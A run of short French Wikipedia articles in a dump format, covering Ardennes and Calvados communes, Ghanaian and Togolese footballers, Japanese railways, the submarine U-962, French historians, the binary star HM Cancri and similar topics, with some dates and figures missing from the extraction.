La commune est née le avec le statut de commune nouvelle à la suite de la fusion des deux communes : Amblimont et l'ancienne commune Mouzon, ces deux communes prenant alors le statut de commune déléguée.
Politique et administration.
Composition.
La commune nouvelle est formée par la réunion de deux anciennes communes : 
Population et société.
Sports.
Amical Club Mouzon, le club de football de la commune connut la Division 2 durant la saison 1971-1972 avant de fusionner en 1974 avec le Club sportif Sedan Ardennes pour donner le Club sportif Sedan Mouzon Ardennes.
Économie.
Il convient de se reporter aux articles consacrés aux anciennes communes fusionnées.
Culture locale et patrimoine.
La commune a obtenu le label Petite cité de caractère en 2018.
Lieux et monuments.
Il convient de se reporter aux articles consacrés aux anciennes communes fusionnées.
Personnalités liées à la commune.
Il convient de se reporter aux articles consacrés aux anciennes communes fusionnées.
Voir aussi.
Bibliographie.
Il convient de se reporter aux articles consacrés aux anciennes communes fusionnées.

</doc>
<doc id="10579880" url="https://fr.wikipedia.org/wiki?curid=10579880" title="Junius (pseudonyme)">
Junius (pseudonyme)

Junius est le pseudonyme d'un pamphlétaire et polémiste anonyme, auteur des Lettres de Junius, , consistant en une série de lettres parues de à dans le "", et qui étaient dirigées contre le ministère de lord North. 
On n'en connaît pas encore le véritable auteur avec certitude : on a nommé Burke, lord Sackville, Hamilton, Philip Francis, Hugh Boyd, Glover, lord Temple, lord Grenville, W. H. Bentinck, le libraire Almon, qui en était l'éditeur. On penche aujourd'hui pour Philip Francis, secrétaire de lord Chatam et membre du Parlement, mort en 1818. Les meilleures éditions de ces lettres sont celles de Londres, 1796, 1812, et d’Édimbourg, 1822. Elles ont été traduites en français en 1791 et en 1823, par J. T. Parisot.
En 2005 dans son livre "Les Mystères d'Avebury", Robert Goddard place l'identité de Junius et une édition des "Lettres de Junius" dans l'une des intrigues principales.

</doc>
<doc id="10579882" url="https://fr.wikipedia.org/wiki?curid=10579882" title="Mandrews">
Mandrews



</doc>
<doc id="10579887" url="https://fr.wikipedia.org/wiki?curid=10579887" title="Edwin Gyimah">
Edwin Gyimah

Edwin Gyimah (né le à Sékondi au Ghana) est un joueur de football international ghanéen, qui évolue au poste de défenseur et de milieu de terrain.
Il évolue avec le club des Orlando Pirates.
Biographie.
Carrière en club.
Gyimah joue plus de 100 matchs en première division sud-africaine.
Carrière en sélection.
Il reçoit sa première sélection en équipe du Ghana le 15 août 2012, en amical contre la Chine (match nul 1-1).
Il participe avec le Ghana à la Coupe d'Afrique des nations en 2015 et en 2017. Le Ghana atteint la finale de la CAN en 2015, en étant battu par la Côte d'Ivoire. Gyimah ne joue toutefois aucun match lors de cette compétition.

</doc>
<doc id="10579888" url="https://fr.wikipedia.org/wiki?curid=10579888" title="Sunrise Izumo">
Sunrise Izumo

Le Sunrise Izumo (サンライズ出雲) est un train express de nuit reliant Tokyo à Izumo au Japon et exploité par les compagnies JR West, JR Central et JR East.
Résumé.
Le Sunrise Izumo est entré en service le en même temps que le Sunrise Seto. Il effectue une liaison aller-retour journalière entre Tokyo et Izumo dans la préfecture de Shimane. Le Sunrise Izumo et le Sunrise Seto circulent ensemble entre Tokyo et Okayama. Une fois arrivés à Okayama, ils sont découplés et effectuent chacun leur propre liaison. Le Sunrise Izumo bifurque en direction du nord-ouest vers Izumo tandis que le Sunrise Seto continue vers Takamatsu. L'origine du nom du train vient du nom de l'ancienne province d'Izumo qui correspond à peu près à la région est de l'actuelle préfecture de Shimane. Depuis la fin de l'exploitation des trains de nuit Cassiopeia et Hamanasu, les et , le Sunrise Izumo est avec le Sunrise Seto le dernier train de nuit en service régulier au Japon.
Matériel.
Le train consiste en une rame automotrice à 7 voitures de la série 285. La rame compte 14 voitures lorsque le Sunrise Seto et le Sunrise Izumo sont couplés à Okayama.
Intérieur.
Les voitures sont équipées de lits, toilettes et douches.

</doc>
<doc id="10579889" url="https://fr.wikipedia.org/wiki?curid=10579889" title="Jean Bertrandi">
Jean Bertrandi



</doc>
<doc id="10579893" url="https://fr.wikipedia.org/wiki?curid=10579893" title="Amiral Nakhimov (croiseur de bataille)">
Amiral Nakhimov (croiseur de bataille)



</doc>
<doc id="10579897" url="https://fr.wikipedia.org/wiki?curid=10579897" title="Richard Ofori">
Richard Ofori

Richard Ofori (né le au Ghana) est un footballeur international ghanéen, qui évolue au poste de gardien de but.
Il évolue avec le club des Wa All Stars.
Biographie.
Carrière en sélection.
Richard Ofori reçoit sa première sélection en équipe du Ghana le , contre la Côte d'Ivoire (victoire 2-1). Il participe avec le Ghana à sa première compétition internationale lors de la Coupe d'Afrique des nations 2017 organisée au Gabon. Deux ans plus tard, il figure sur la liste des joueurs sélectionnées pour participer à la Coupe d'Afrique des nations 2019. Le 31 décembre 2023, il est retenu dans la liste des vingt-sept joueurs ghanéens sélectionnés par Chris Hughton pour disputer la Coupe d'Afrique des nations 2023. 

</doc>
<doc id="10579899" url="https://fr.wikipedia.org/wiki?curid=10579899" title="Louis de Guise (1527-1578)">
Louis de Guise (1527-1578)



</doc>
<doc id="10579904" url="https://fr.wikipedia.org/wiki?curid=10579904" title="Hirofumi Matsuoka">
Hirofumi Matsuoka

 est un créateur japonais de jeux vidéo. Alors qu'il était employé chez Nintendo (-), il participe à la conception de plusieurs jeux dans la franchise de "Wario" et est également impliqué dans la série de Metroid, en tant que concepteur du premier jeu de la série intitulé "Metroid" et artiste graphique sur le jeu "Super Metroid".

</doc>
<doc id="10579908" url="https://fr.wikipedia.org/wiki?curid=10579908" title="Anne et les Tremblements">
Anne et les Tremblements

Anne et les Tremblements est un court métrage réalisé par Sólveig Anspach et sorti en 2010. Il a été présenté à plusieurs festivals en 2010 et 2011, et sélectionné pour le César du meilleur court métrage 2012.
Synopsis.
Anne doit réorganiser et ranger son appartement, situé au cinquième étage d'un immeuble à proximité d'une ligne de métro, car le passage des rames provoque des vibrations chez elle. Elle écrit à la RATP pour essayer de résoudre le problème.
Commentaires.
Inspiré d'une histoire vraie, le film est un mélange entre fiction et réalité. Anne, une amie de Sólveig Anspach, y joue son propre rôle. L'ingénieur du son est filmé en train d'essayer de capter les vibrations.

</doc>
<doc id="10579909" url="https://fr.wikipedia.org/wiki?curid=10579909" title="Unterseeboot 962">
Unterseeboot 962

L'Unterseeboot 962 ou U-962 est un sous-marin allemand (U-Boot) de type VIIC utilisé par la "Kriegsmarine" pendant la Seconde Guerre mondiale.
Le sous-marin fut commandé le à Hambourg (Blohm + Voss), sa quille fut posée le , il fut lancé le et mis en service le , sous le commandement de l"'Oberleutnant zur See" Ernst Liesberg.
L"'U-962" n'endommagea ou ne coula aucun navire au cours des 2 patrouilles (116 jours en mer) qu'il effectua.
Il fut coulé par la "Royal Navy" dans l'Atlantique Nord en .
Conception.
Unterseeboot type VII, l"'U-962" avait un déplacement de en surface et en plongée. Il avait une longueur totale de , un maître-bau de , une hauteur de et un tirant d'eau de . Le sous-marin était propulsé par deux hélices de , deux moteurs diesel Germaniawerft "M6V 40/46" de en ligne de à , produisant un total de à en surface et de deux moteurs électriques Brown, Boveri &amp; Cie "GG UB 720/8" de 375 cv à 295 tr/min, produisant un total , en plongée. Le sous-marin avait une vitesse en surface de () et une vitesse de () en plongée. Immergé, il avait un rayon d'action de marins () à (; par heure) et pouvait atteindre une profondeur de . En surface son rayon d'action était de nautiques (soit ) à ().
L"U-962" était équipé de cinq tubes lance-torpilles de (quatre montés à l'avant et un à l'arrière) et embarquait quatorze torpilles. Il était équipé d'un canon de 8,8 cm SK C/35 (220 coups) et d'un canon antiaérien de Flak. Il pouvait transporter 26 mines "TMA" ou "TMB". Son équipage comprenait et .
Historique.
Il reçut sa formation de base au sein de la 5. Unterseebootsflottille jusqu'au , puis il intégra sa formation de combat dans la 7. Unterseebootsflottille.
Sa première patrouille est précédée d'un court trajet de Kiel à Bergen. Elle commence le au départ de Bergen. Le sous-marin traverse la ligne GIUK et patrouille dans le Trou noir de l'Atlantique. Après 56 jours en mer, il rejoint son port d'attache de Saint-Nazaire le .
L"U-962" reprend la mer pour sa seconde patrouille le . Après 55 jours de mer dans l'Atlantique, l"'U-962" est coulé pendant son retour vers la base le , au nord-ouest du cap Finisterre à la position , par des charges de profondeur des sloops britanniques et .
Les 50 membres d'équipage meurent dans cette attaque.
Patrouilles.
Opérations "Wolfpack".
L"'U-962" a opéré avec les "Wolfpacks" (meute de loups) durant sa carrière opérationnelle.

</doc>
<doc id="10579917" url="https://fr.wikipedia.org/wiki?curid=10579917" title="Marguerite de Valois (1553-1615)">
Marguerite de Valois (1553-1615)



</doc>
<doc id="10579920" url="https://fr.wikipedia.org/wiki?curid=10579920" title="Scarlett Beauvalet">
Scarlett Beauvalet

Scarlett Beauvalet-Boutouyrie est une historienne française, professeure à l'université de Picardie, spécialiste d'histoire sociale (histoire de la famille, des femmes et de la santé en France à l'époque moderne) et auteure d'ouvrages de référence dans ce domaine. Elle a été élevée au grade de Chevalier dans l'ordre des Palmes académiques en 2016.

</doc>
<doc id="10579933" url="https://fr.wikipedia.org/wiki?curid=10579933" title="Golfe de La Spezia">
Golfe de La Spezia

Le (ou "Golfe des Poètes") est un golfe de la mer de Ligurie, situé sur la côte nord-ouest de l'Italie. 
Situation.
Il est nommé d'après la ville de La Spezia, le principal port s'y trouvant. Il est compris entre les villes de Porto Venere (à l'ouest) et de Lerici (à l'est). Il comprend trois îles : Palmaria, Tino et Tinetto.
&lt;mapframe zoom=11 latitude =44.0639 longitude =9.8833 align=left width=250 height=250 text="Carte interactive du golfe de La Spezia"&gt;{
 "type": "FeatureCollection",
 "features": [
 "type": "Feature",
 "properties": {
 "marker-color": "#ff8040",
 "marker-size": "medium",
 "marker-symbol": "water"
 "geometry": {
 "type": "Point",
 "coordinates": [
 9.846668243408203,
 44.08783162859381
 ]
}&lt;/mapframe&gt;

</doc>
<doc id="10579934" url="https://fr.wikipedia.org/wiki?curid=10579934" title="Signe cabalistique">
Signe cabalistique



</doc>
<doc id="10579938" url="https://fr.wikipedia.org/wiki?curid=10579938" title="Gare de Sanyo Himeji">
Gare de Sanyo Himeji

La est une gare ferroviaire localisée dans la ville d'Himeji, dans la préfecture de Hyōgo au Japon. La gare est exploitée par la compagnie Sanyo Electric Railway, sur la ligne principale Sanyo Electric Railway. Le numéro de la gare est SY 43.
Situation ferroviaire.
Établie à d'altitude, la gare de Sanyō Himeji est située au point kilométrique (PK) 54.7 de la ligne principale Sanyo Electric Railway.
Histoire.
C'est le que la gare est inaugurée par la compagnie électrique de Hyogo sous le nom de . En , la compagnie électrique de Hyogo fusionne avec la compagnie électrique de Ujigawa. En , la compagnie électrique de Ujigawa se sépare de sa partie ferroviaire qui la laisse à la compagnie électrique de Hyogo. De là, la compagnie électrique de Hyogo et la section ferroviaire de la compagnie électrique de Ujigawa donne naissance à une nouvelle société, la Sanyō Electric Railway, le . Le , la gare change de nom et devient la . C'est en que la gare prend son nom actuel.
En , la fréquentation journalière de la gare était de .
Service des voyageurs.
Accueil.
La gare possède des consignes automatique.
Desserte.
La gare de Sanyō Himeji est une gare disposant de quatre quais et de quatre voies.
Intermodalité.
Bus.
Des bus de la compagnie Shinki Bus desservent la gare vers l'aéroport international du Kansai et celui d'Osaka notamment.

</doc>
<doc id="10579939" url="https://fr.wikipedia.org/wiki?curid=10579939" title="FC Altaï Semeï">
FC Altaï Semeï



</doc>
<doc id="10579947" url="https://fr.wikipedia.org/wiki?curid=10579947" title="Eva Kotàtkova">
Eva Kotàtkova



</doc>
<doc id="10579948" url="https://fr.wikipedia.org/wiki?curid=10579948" title="U-962">
U-962



</doc>
<doc id="10579952" url="https://fr.wikipedia.org/wiki?curid=10579952" title="Lycée français international Marguerite-Duras">
Lycée français international Marguerite-Duras

Le lycée français international Marguerite-Duras est un lycée français situé dans le d'Hô Chi Minh-Ville, la plus grande métropole du Viêt Nam. Il assure la poursuite des activités de l'École française Colette, qui existait déjà au début des années 1960 à Saïgon mais avait dû céder ses locaux à une école vietnamienne en 1975, avant de reprendre sa croissance à partir de 1990, année marquée par l'ouverture du Viet Nam sur l'étranger et la création de l'Agence pour l'enseignement français à l'étranger (AEFE).
Informations.
Le bâtiment actuel est mis en chantier en 2009 et inauguré en 2011, dans le quartier Long Binh de la ville, par l'AEFE et le consulat général de France à Hô Chi Minh-Ville.
L'établissement géré par l'AEFE et homologué par le ministère français de l'Éducation nationale, accueille plus de 970 élèves, de la maternelle au baccalauréat, dont environ 764 Français.
Il est situé route , district 9, Long Binh, Hô Chi Minh-Ville. 

</doc>
<doc id="10579956" url="https://fr.wikipedia.org/wiki?curid=10579956" title="Décès en 1259">
Décès en 1259

Cette page dresse une liste de personnalités mortes au cours de l'année 1259 :

</doc>
<doc id="10579958" url="https://fr.wikipedia.org/wiki?curid=10579958" title="Anne-Marie Sohn">
Anne-Marie Sohn

Anne-Marie Sohn est une historienne française née en , spécialiste d'histoire du genre et d'histoire de la vie privée dans le monde occidental à l'époque contemporaine, professeure à l'École normale supérieure de Lyon avant son départ à la retraite.
Enfance et formation.
Anne-Marie Sohn nait à Grasse en 1946 dans une famille de travailleurs de la parfumerie depuis deux générations. Sa mère, fille d'immigrés italiens travaille comme secrétaire à la parfumerie Jean Niel, où elle rencontre son père réfugié juif allemand qui y travaille comme ingénieur chimiste. Sa mère est catholique pratiquante et son père athée. Ils sont tous deux de gauche et votent communistes. Anne-Marie Sohn est scolarisée à l'école publique à Grasse puis à en classes préparatoires à Aix-en-Provence avant d'intégrer l'École normale supérieure de Fontenay-aux-Roses en 1965. Elle obtient l'agrégation d'histoire en 1969.
Carrière.
Après l'agrégation, elle enseigne en lycée dans la région parisienne puis en classes préparatoires au lycée Molière puis au lycée Henri-IV tout en préparant une thèse de cycle sous la direction d'Annie Kriegel à Nanterre. Pionnière dans l'écriture de l'histoire des femmes, elle termine en 1973 une thèse sur "Féminisme et syndicalisme : les institutrices de la Fédération unitaire de l'enseignement de 1919 à 1935". Elle réalise ensuite une thèse d'État sous la direction de Maurice Agulhon à Paris I et soutenue en 1993 portant sur "Les rôles féminins dans la vie privée à l'époque de la République, rôles théoriques, rôles vécus". Elle est alors maître assistante à Paris I. Elle publie sa thèse sous forme d'ouvrage trois ans plus tard, sous le titre "Chrysalides, femmes dans la vie privée". Elle devient professeure d'histoire à l'université de Rouen en 1994, puis à l'ENS de Lyon en 2004. Elle s'intéresse à l'histoire de la construction de la masculinité.

</doc>
<doc id="10579963" url="https://fr.wikipedia.org/wiki?curid=10579963" title="Arthur Power">
Arthur Power

Arthur John Power est un officier britannique de la Royal Navy, la marine militaire du Royaume-Uni.
Biographie.
Il est né à Londres le 12 avril 1889 et décédé le 28 avril 1960 au Royal Hospital Haslar, à Gosport. Il prend part à la Première Guerre mondiale en tant que officier d'artillerie durant la bataille des Dardanelles. Durant l'entre deux guerres, il commande l'école d'artillerie et le porte-avions . Au cours de la Seconde Guerre mondiale, il prend un rôle actif dans la planification du débarquement allié en Sicile (Opération Husky) et en Italie (Opération Avalanche). Il commande les forces navales pour le débarquement du 5 corps d'armée britannique à Tarente en septembre 1943. À la fin du conflit, il devient commandant en chef de l"Eastern Fleet" et conduit des raids navals sur les positions de l'Armée impériale japonaise à Bornéo et sur la Malaisie britannique. Après la guerre, il est nommé "Second Sea Lord", commandant en chef de la "Mediterranean Fleet" et "Commander-in-Chief, Portsmouth".
Il se marie en 1918 avec Amy Bingham, ils ont trois fils dont l'amiral britannique Arthur Mackenzie Power. Son épouse décède en 1945, il se marie en 1947 avec Margaret Joyce Watson.

</doc>
<doc id="10579964" url="https://fr.wikipedia.org/wiki?curid=10579964" title="Goussainville (commune déléguée)">
Goussainville (commune déléguée)



</doc>
<doc id="10579965" url="https://fr.wikipedia.org/wiki?curid=10579965" title="Rosemarie Dexter">
Rosemarie Dexter

Rosemarie Dexter, dite parfois Rosemary Dexter, est une actrice britanno-italienne née le à Quetta (Pakistan) et morte le à Recanati dans les Marches (Italie).
Biographie.
Rosemarie Dexter est née au Pakistan d'un père britannique et d'une mère anglo-birmane. Elle arrive en Italie au début des années 1960 et rencontre le réalisateur Ugo Gregoretti qui lui propose le premier rôle féminin dans son film de science-fiction "Omicron".
L'année suivante, elle tourne deux films réalisés par Silvio Amadio : "Desideri d'estate" avec Gabriele Ferzetti et "Filles et Garçons" où elle donne la réplique au Français Jacques Perrin. Elle incarne ensuite Juliette Capulet dans le "Roméo et Juliette" de Riccardo Freda, et enchaîne avec "Casanova 70" de Mario Monicelli où elle joue aux côtés de Marcello Mastroianni, Michèle Mercier, Virna Lisi et Marisa Mell, et surtout "Et pour quelques dollars de plus" de Sergio Leone où elle incarne la sœur de Lee Van Cleef.
Elle va tourner pour le Français Philippe de Broca, les Britanniques John Guillermin, Michael Anderson ou Jim O'Connolly, l'Espagnol Jesús Franco et le Japonais Koreyoshi Kurahara, mais elle va rester tout au long de sa carrière en Italie à tourner des films nationaux, du western spaghetti ("La Boue, le Massacre et la Mort") à la comédie avec Franco et Ciccio ("Mazzabubù... Quante corna stanno quaggiù?") au giallo ("L'Œil du labyrinthe"), du film d'action ("Un homme appelé Karaté") à la comédie érotique italienne ("Les Polissonnes excitées").
En février 1975, elle a posé nue pour l'édition italienne du magazine Playboy, pour ensuite quitter le monde du cinéma vers la fin des années 1970.
Elle a été retrouvée morte des suites d'une maladie grave le dans sa demeure à Recanati, où elle vivait depuis un certain temps dans un anonymat complet. Le décès remontait à deux ou trois jours avant la découverte du cadavre. Son corps a été incinéré et ses cendres ont été dispersées.

</doc>
<doc id="10579971" url="https://fr.wikipedia.org/wiki?curid=10579971" title="HM Cancri">
HM Cancri

HM Cancri (en abrégé HM Cnc), également désigné RX J0806.3+1527 et parfois raccourci J0806, est un système d'étoile binaire à rayons X situé à environ . Il comprend deux naines blanches denses qui orbitent toutes les (dans ce système, la durée de « l'année » n'est que de ), à une distance estimée de seulement l'une de l'autre (environ 1/5 de la distance entre la Terre et la Lune).
Les deux étoiles orbitent entre elles à des vitesses supérieures à 400 kilomètres par seconde. On estime leur masse à environ la moitié de celle de notre Soleil. Comme les naines blanches typiques, elles sont extrêmement denses, étant composées de matière dégénérée, et ont ainsi des rayons de l'ordre de celui de la Terre. Les astronomes pensent que les deux étoiles finiront par fusionner, à partir de données provenant de nombreux satellites de mesure des rayons X, comme l'observatoire X-Ray Chandra, le XMM-Newton et le télescope spatial Swift. Ces données montrent que la période orbitale des deux étoiles est en constante diminution à raison de 1,2 milliseconde par an, car elles se rapprochent ainsi d'environ 60 centimètres par jour. Avec une période de révolution de 5,4 minutes, HM Cancri / RX J0806 est le système binaire dont la période orbitale est la plus courte connue.

</doc>
<doc id="10579976" url="https://fr.wikipedia.org/wiki?curid=10579976" title="Rots">
Rots

Rots est une commune française située dans le département du Calvados en région Normandie, peuplée de .
Le , elle est créée avec le statut de commune nouvelle, issue de la fusion de trois communes : l'ancienne commune de Rots, Lasson et Secqueville-en-Bessin qui deviennent des communes déléguées.
Géographie.
La commune est en plaine de Caen, aux portes du Bessin, intégrée à l'unité urbaine de Caen au sens de l'Institut national de la statistique et des études économiques. Son bourg est à à l'ouest de Caen, à au sud de Creully, à à l'est de Tilly-sur-Seulles et à au sud-est de Bayeux.
La commune est facilement accessible par la nationale 13 reliant Caen et Bayeux.
La commune est desservie par la ligne 30 des bus verts du Calvados. Une des branches de la ligne 20 du réseau Twisto dessert la commune (Rots Bonny ou Authie Jacques Cartier - Cambes Le Parc)
Hydrographie.
La commune est située dans le bassin Seine-Normandie. Elle est drainée par la Thue, la Mue, la Chironne, des bras de la Mue et divers autres petits cours d'eau.
La Thue, d'une longueur de , prend sa source dans la commune de Thue et Mue et se jette dans la Seulles à Ponts sur Seulles, après avoir traversé . 
La Mue, d'une longueur de , prend sa source dans la commune de Thue et Mue et se jette dans la Seulles à Reviers, après avoir traversé . 
Climat.
Plusieurs études ont été menées afin de caractériser les types climatiques auxquels est exposé le territoire national. Les zonages obtenus diffèrent selon les méthodes utilisées, la nature et le nombre des paramètres pris en compte, le maillage territorial des données et la période de référence. En 2010, le climat de la commune était ainsi de type climat océanique altéré, selon une étude du Centre national de la recherche scientifique (CNRS) s'appuyant sur une méthode combinant données climatiques et facteurs de milieu (topographie, occupation des sols, etc.) et des données couvrant la période 1971-2000. En 2020, le climat prédominant est classé Cfb, selon la classification de Köppen-Geiger, pour la période 1988-2017, à savoir un climat tempéré à été frais sans saison sèche. Par ailleurs Météo-France publie en 2020 une nouvelle typologie des climats de la France métropolitaine dans laquelle la commune est exposée à un climat océanique et est dans la région climatique Normandie (Cotentin, Orne), caractérisée par une pluviométrie relativement élevée () et un été frais () et venté. Elle est en outre dans la zone H1a au titre de la réglementation environnementale 2020 des constructions neuves.
Pour la période 1971-2000, la température annuelle moyenne est de , avec une amplitude thermique annuelle de . Le cumul annuel moyen de précipitations est de , avec de précipitations en janvier et en juillet. Pour la période 1991-2020, la température moyenne annuelle observée sur la station météorologique de Météo-France la plus proche, sur la commune de Carpiquet à à vol d'oiseau, est de et le cumul annuel moyen de précipitations est de . .
Pour afficher une liste d’indicateurs climatiques caractérisant la commune aux horizons 2030, 2050 et 2100 et pouvoir ainsi s'adapter aux changements climatiques, entrer son nom dans Climadiag-commune, un site de Météo-France élaboré à partir des nouvelles projections climatiques de référence DRIAS-2020.
Urbanisme.
Typologie.
Au , Rots est catégorisée commune rurale à habitat dispersé, selon la nouvelle grille communale de densité à définie par l'Insee en 2022.
Elle appartient à l'unité urbaine de Caen, une agglomération intra-départementale dont elle est une commune de la banlieue. Par ailleurs la commune fait partie de l'aire d'attraction de Caen, dont elle est une commune de la couronne. Cette aire, qui regroupe , est catégorisée dans les aires de à moins de .
Toponymie.
Le nom de la localité est attesté sous la forme "Rausus" en 876.
Du germanique "raus" ou directement de l'ancien français "ros" issu du germanique "raus" « roseau », tout comme Rosel, Le Rozel ou Rosay. En effet, « le Calvados contient un grand nombre de marais tourbeux, comme celui de Rots (village dans les marais de la Mue), de Bellengreville, de Troarn; qui présentent un tissu spongieux, formé de mousse, de roseaux, de joncs, de racines, de feuilles et de tiges végétales ».
Le gentilé est "Rotier".
Histoire.
L'histoire de Rots est une synthèse des informations contenues dans les articles des communes déléguées dont elle est issue.
Rots était le lieu de villégiature de la reine Mathilde de Flandre, duchesse de Neuilly et épouse du duc de Normandie et roi d'Angleterre Guillaume le Conquérant.

</doc>
<doc id="10579981" url="https://fr.wikipedia.org/wiki?curid=10579981" title="Ben Wilkins">
Ben Wilkins

Ben Wilkins est un mixeur et un monteur son disposant de la double nationalité britannique et américaine.
Biographie.
Depuis la fin des années 1980, Ben Wilkins a travaillé pour "The Tape Gallery", "Reelsound", "Danetracks", "Todd-AO", "Sony Pictures Entertainment", "Warner Bros.", "CSS Studios" et "Technicolor".
Il est membre de l'Academy of Motion Picture Arts and Sciences, de la British Academy of Film and Television Arts et de Motion Picture Sound Editors.

</doc>
<doc id="10579984" url="https://fr.wikipedia.org/wiki?curid=10579984" title="Andy Yiadom">
Andy Yiadom

Andrew Kyere Yiadom, plus connu sous le nom d'Andy Yiadom (né le à Holloway (Londres) en Angleterre) est un footballeur ghanéen, qui évolue au poste de défenseur et de milieu de terrain au Reading FC.
Biographie.
Carrière en sélection.
En , il se voit retenu par le sélectionneur Avraham Grant afin de participer à la Coupe d'Afrique des nations 2017 avec le Ghana, alors qu'il n'a pourtant encore jamais joué en équipe nationale.

</doc>
<doc id="10579985" url="https://fr.wikipedia.org/wiki?curid=10579985" title="Communauté de communes des Monts de Lacaune et de la Montagne du Haut Languedoc">
Communauté de communes des Monts de Lacaune et de la Montagne du Haut Languedoc

La Communauté de Communes du Haut-Languedoc (CCHL) est une communauté de communes française, situées à cheval sur le département de l'Hérault et sur le département du Tarn dans la région Occitanie.
Histoire.
Dans le cadre de la loi NOTRe et depuis le , la communauté de communes Monts de Lacaune et Montagne du Haut Languedoc est née de la fusion de la communauté de communes de la Montagne du Haut Languedoc et de la communauté de communes des Monts de Lacaune. Elle s'appelle désormais Communauté de Communes du Haut-Languedoc depuis 2024.
Le , la commune de Saint-Salvi-de-Carcavès rejoint la Communauté de Communes.
Territoire communautaire.
Composition.
La communauté de communes est composée des suivantes :
 
Administration.
Siège.
Le siège de la communauté de communes est à Lacaune, 5 rue de l'Artisanat.
Conseil communautaire.
Les 39 conseillers titulaires sont ainsi répartis selon le droit commun comme suit :
 
Élus.
La communauté de communes est administrée par son conseil communautaire constitué en 2020 de communautaires, qui sont des conseillers municipaux représentant chacune des communes membres.
À la suite des élections municipales de 2020 dans l'Hérault et dans le Tarn, le conseil communautaire du a élu son président, Daniel Vidal, maire de Murat-sur-Vèbre, ainsi que ses -présidents.
Le bureau est remanié en à la suite du décès de Claude Aninat, maire de Barre, et le après la démission du président Daniel Vidal et l'élection de Francis Cros, maire de La Salvetat-sur-Agout, à ce poste. Depuis cette date, la liste des vice-présidents est la suivante :
Ensemble, ils forment le bureau communautaire pour la période 2020-2026.
Compétences.
L'intercommunalité exerce les compétences qui lui ont été transférées par les communes membres, dans les conditions définies par le code général des collectivités territoriales.
Régime fiscal et budget.
La communauté de communes est un établissement public de coopération intercommunale à fiscalité propre.
Afin de financer l'exercice de ses compétences, l'intercommunalité perçoit la fiscalité professionnelle unique (FPU) – qui a succédé à la taxe professionnelle unique (TPU) – et assure une péréquation de ressources entre les communes résidentielles et celles dotées de zones d'activité.

</doc>
<doc id="10579993" url="https://fr.wikipedia.org/wiki?curid=10579993" title="Sanyo Railway">
Sanyo Railway

La est une ancienne compagnie de chemin de fer créée en 1888 au cours de la période Meiji au Japon. Le siège de la compagnie était basé à Kobe.
Histoire.
La première ligne de chemin de fer a ouvert en . En , la compagnie Sanyō prolonge ses lignes à l'ouest, le long de la côte de la mer intérieure de Seto, de Kobe à Hiroshima. Le chemin de fer fut ensuite étendu à Shimonoseki. La ligne Sanyō est reliée à la ligne principale Tōkaidō à Kobe. La compagnie continue son extension et elle relie la compagnie ferroviaire de Kyūshū à Kitakyūshū. La compagnie a gagné une réputation pour être l'une des plus innovatrices au Japon. Elle introduit les premières voitures disposant de lits, les voitures restaurant et l'éclairage électrique sur ses trains. En , le voyage de 530 km entre Kobe à Shimonoseki prend . En , la compagnie est intégrée dans la Société gouvernementale des chemins de fer japonais.
Lignes.
À la veille de son rattachement à la société gouvernementale, la compagnie gérait un peu moins de 700 km de lignes.

</doc>
<doc id="10579998" url="https://fr.wikipedia.org/wiki?curid=10579998" title="Raoul de la Flèche">
Raoul de la Flèche

Raoul de la Flèche (mort le ) est un ecclésiastique qui fut évêque de Saint-Brieuc de 1329 à 1335. D'origine noble, il est lié à la famille de Beaumont.
Biographie.
Raoul de la Flèche est le chapelain de Raymond-Guilhem de Fargues, le cardinal-neveu de Clement V. Il est d'abord chantre à l'abbaye de St-Aubin avant de devenir chanoine à Nantes en 1317. En 1323, il est sous-chantre à Albi. De retour dans le diocèse d'Angers, il devient chanoine de St-Pierre et archiprêtre de Saumur. À la mort d'Hugues Odard en décembre 1323, Il est élu évêque d'Angers par le chapitre. Jean XXII casse la décision et nomme à sa place en 1324 Foulques de Mathefelon. Le il est nommé évêque de Saint-Brieuc après les défections successives d'André de Florence, Guillaume de Roseyo et de Mathieu Ferrand. Il fait sa soumission à la Chambre apostolique le . Le 1 septembre suivant, il est parmi les prélats réunis à Vincennes par le roi Philippe V de France pour statuer sur la juridiction entre les évêques et les officiers royaux. Dans son diocèse il est à l'origine de la chapelle Notre-Dame près du pont de Gouëdic. Il meurt en 1335 le 17 mars selon l'obituaire de l'abbaye de Beauport.

</doc>
<doc id="10580001" url="https://fr.wikipedia.org/wiki?curid=10580001" title="Coupe CECAFA des clubs 2000">
Coupe CECAFA des clubs 2000

La Coupe CECAFA des clubs 2000 est la vingt-sixième édition de la Coupe Kagame inter-club, une compétition organisée par la CECAFA (Conseil des Associations de Football d'Afrique de l'Est et Centrale) et qui regroupe les clubs d'Afrique de l'Est s'étant illustré dans leur championnat national. 
Cette édition regroupe huit formations réparties en deux poules. Les deux premiers de chaque poule se qualifient pour la phase finale, jouée en matchs à élimination directe.
C'est le club kenyan du Tusker FC qui remporte le trophée, après avoir battu en finale les Rwandais d'APR FC. C'est le troisième titre de l'histoire du club dans la compétition. 
Le Rwanda, pays hôte de la compétition, a le droit d'engager deux clubs alors que l'ensemble des autres membres de la CECAFA aligne un représentant. L'Éthiopie et l'Érythrée n'envoient pas leur représentant car les deux pays sont en conflit à la suite d'un litige concernant leur frontière.
Compétition.
Premier tour.
Groupe A :
Groupe B :

</doc>
<doc id="10580018" url="https://fr.wikipedia.org/wiki?curid=10580018" title="Sadat Ouro-Akoriko">
Sadat Ouro-Akoriko

Sadat Ouro-Akoriko (né le à Sokodé au Togo) est un joueur de football international togolais, qui évolue au poste de défenseur.
Il est actuellement à Kazma
Biographie.
Carrière en sélection.
Il reçoit sa première sélection en équipe du Togo le , en amical contre le Bahreïn (défaite 5-1).
Il dispute cinq matchs rentrant dans le cadre des .
Il marque son premier but avec le Togo le , contre le Liberia. Ce match gagné 1-0 rentre dans le cadre des éliminatoires de la Coupe d'Afrique des nations 2017..
Il participe avec le Togo à la Coupe d'Afrique des nations en 2013 et en 2017.

</doc>
<doc id="10580023" url="https://fr.wikipedia.org/wiki?curid=10580023" title="Roger Tréhin">
Roger Tréhin

Roger Tréhin, né le à Lorient, est un coureur cycliste et directeur sportif français. Coureur amateur durant les années 1980 et 1990, il dirige le pôle espoirs Bretagne-Sud à compter de 1999, et est directeur sportif de l'équipe Fortuneo-Vital Concept depuis sa création sous le nom de Bretagne-Jean Floc'h en 2004.
Biographie.
Coureur amateur durant les années 1980 et 1990, il court successivement au VS Lorient, au VC Rennais, au Véloce Vannes, au CCOP Lorient et VC Pays de Lorient. Il met fin à sa carrière en septembre 1998.
En 1999, il prend la direction du pôle espoirs Bretagne-Sud, à Lorient.
